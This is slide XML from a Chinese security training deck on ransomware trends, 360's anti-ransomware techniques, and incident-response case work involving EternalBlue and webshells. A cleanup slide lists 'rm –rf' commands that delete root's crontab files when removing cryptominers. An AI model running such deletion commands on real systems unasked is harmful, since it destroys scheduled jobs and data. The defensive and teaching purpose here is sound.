              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>来指代由</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>RaaS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>服务生成的勒索软件。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>RaaS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>服务允许任何犯罪者注册一个帐户，并创建自己定制版本的撒旦勒索软件。一旦勒索软件被创建，那么犯罪分子将决定如何分发勒索软件，而</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>RaaS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>服务平台将处理赎金支付和增加新功能。对于这项服务，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>RaaS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>服务平台的开发者将收取受害者所支付赎金的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>30</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>％，购买</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>RaaS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>服务者将获取剩余</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>70</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>％的赎金。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>六</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>)	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>境外攻击者多于境内攻击者</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2017</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>年，勒索软件的攻击源头以境外为主。绝大多数的勒索软件攻击者基本都是境外攻击者，国内攻击者较少，而且国内攻击者技术水平也相对较低，制作水平也不高。有些国内攻击者编写的勒索软件程序甚至存在很多漏洞，因此也比较容易被破解。比如：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>MCR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>勒索病毒，我们可以直接获取到密钥从而恢复文件。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5222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DDD67107-BCE8-4CA6-A922-F4C33B07504D}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>192</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9782294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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>一</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>文档自动备份隔离保护</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>文档自动备份隔离技术是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>360</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>独创的一种勒索软件防护技术。这一技术在未来一两年内可能会成为安全软件反勒索技术的标配。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>鉴于勒索软件一旦攻击成功往往难以修复，而且具有变种多，更新快，大量采用免杀技术等特点，因此，单纯防范勒索软件感染并不是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>万全之策</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>。但是，无论勒索软件采用何种具体技术，无论是哪一家族的哪一变种，一个基本的共同特点就是会对文档进行篡改。而文档篡改行为具有很多明显的技术特征，通过监测系统中是否存在文档篡改行为，并对可能被篡改的文档加以必要的保护，就可以在相当程度上帮助用户挽回勒索软件攻击的损失。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>文档自动备份隔离技术就是在这一技术思想的具体实现，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>360</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>将其应用于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>360</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>文档卫士功能模块当中。只要电脑里的文档出现被篡改的情况，它会第一时间把文档自动备份在隔离区保护起来，用户可以随时恢复文件。无论病毒如何变化，只要它有篡改用户文档的行为，就会触发文档自动备份隔离，从而使用户可以免遭勒索，不用支付赎金也能恢复文件。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>360</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>文档卫士的自动备份触发条件主要包括亮点：一、开机后第一次修改文档；二、有可疑程序篡改文档。当出现上述两种情况时，文档卫士会默认备份包括</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Word</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Excel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>PowerPoint</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>PDF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>等格式在内的文件，并在备份成功后出现提示信息。用户还可以在设置中选择添加更多需要备份的文件格式。比如电脑里的照片非常重要，就可以把</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>jpg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>等图片格式加入保护范围。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>此外，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>360</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>文档卫士还集合了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>文件解密</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>功能，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>360</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>安全专家通过对一些勒索软件家族进行逆向分析，成功实现了多种类型的文件解密，如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2017</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>年出现的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>纵情文件修复敲诈者病毒</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>等。如有网友电脑已不慎中招，可以尝试通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>文档解密</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>一键扫描并恢复被病毒加密的文件。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>二</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>综合性反勒索软件技术</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>与一般的病毒和木马相比，勒索软件的代码特征和攻击行为都有很大的不同。采用任何单一防范技术都是不可靠的。综合运用各种新型安全技术来防范勒索软件攻击，已经成为一种主流的技术趋势。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>下面就以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>360</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>安全卫士的相关创新功能来分析综合性反勒索软件技术。相关技术主要包括：智能诱捕、行为追踪、智能文件格式分析、数据流分析等，具体如下。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>智能诱捕技术是捕获勒索软件的利器，其具体方法是：防护软件在电脑系统的各处设置陷阱文件；当有病毒试图加密文件时，就会首先命中设置的陷阱，从而暴露其攻击行为。这样，安全软件就可以快速无损的发现各类试图加密或破坏文件的恶意程序。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>行为追踪技术是云安全与大数据综合运用的一种安全技术。基于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>360</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>的云安全主动防御体系，通过对程序行为的多维度智能分析，安全软件可以对可疑的文件操作进行备份或内容检测，一旦发现恶意修改则立即阻断并恢复文件内容。该技术主要用于拦截各类文件加密和破坏性攻击，能够主动防御最新出现的勒索病毒。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>智能文件格式分析技术是一种防护加速技术，目的是尽可能的降低反勒索功能对用户体验的影响。实际上，几乎所有的反勒索技术都会或多或少的增加安全软件和电脑系统的负担，相关技术能否实用的关键就在于如何尽可能的降低其对系统性能的影响，提升用户体验。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>360</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>研发的智能文件格式分析技术，可以快速识别数十种常用文档格式，精准识别对文件内容的破坏性操作，而基本不会影响正常文件操作，在确保数据安全的同时又不影响用户体验。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>数据流分析技术，是一种将人工智能技术与安全防护技术相结合的新型文档安全保护技术。首先，基于机器学习的方法，我们可以在电脑内部的数据流层面，分析出勒索软件对文档的读写操作与正常使用文档情况下的读写操作的区别；而这些区别可以用于识别勒索软件攻击行为；从而可以在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>第一现场</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>捕获和过滤勒索软件，避免勒索软件的读写操作实际作用于相关文档，从而实现文档的有效保护。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5427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8234C8DB-B4B0-441E-8686-6852F218D7A0}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>193</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17282546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dirty="0"/>
              <a:t>服务器类型：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>linux</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>cms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>dedecms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>phpcms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>trs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>cms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>等</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>中间件、容器、框架、数据库：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>tomcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>iis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>apache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>weblogic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>struts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mysql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>等</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>脚本语言：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>asp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>jsp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>等</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>业务架构：如前端网页内容是否是后端通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ftp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>上传的（新闻网偏多）等</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>这里了解的信息要尽量详细，为下一步分析收集足够证据；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6246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39B3EF4-5C8B-4968-AA88-DC7D94A6FEBB}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>196</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34894990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2"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656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2C2F7E2-B71E-463C-9F76-F654FBB63A3B}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>199</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8675074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0"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a:t>通过查看系统发现该系统为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2008R2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>并且没有打过补丁不排除是通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>永恒之蓝</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>漏洞或弱口令进入（通过了解之前该机器存在弱口令）。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>通过对机器业务了解发现该机器运行了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>oracle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>与</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>sqlserver</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>iis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>服务，因为客户也无法确定</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>oracle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>sqlserver</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>管理密码所以无法判定数据库服务是否是存在弱口令，通过对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>iis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>网站目录进行扫描发现多个</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Webshell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>后门最早后门时间可以追溯到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2014/10/17</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>年：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>通过对后门文件路径进行分析发现应该是通</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>xxx.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>网站的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>FCKeditor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>的模块进行上传。删除</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Webshell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>后发现</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>IIS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>配置被破坏访问该服务器其他站点均可访问但是访问主站时会提示</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>503</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>错误，通过新建网站配置解决该问题但是访问时发现多个图片文件显示不正常通过排查发现网站目录下的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>upload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"/>
              <a:t>文件被删除并且无法恢复。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7373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ACFFA414-E74D-47AA-8630-0EF7C9044F9C}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>205</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="206565134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8"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清除挖矿后台任务</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>下例如：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>rm –rf /var/spool/cron/root</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>rm –rf /var/spool/cron/crontabs/root</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>下例如：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>移除</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Microsoft.NET_Framework_NGENS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>挖矿服务</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>安装杀毒软件，进行全盘杀毒。</a:t>
            </a:r>
          </a:p>
          <a:p>
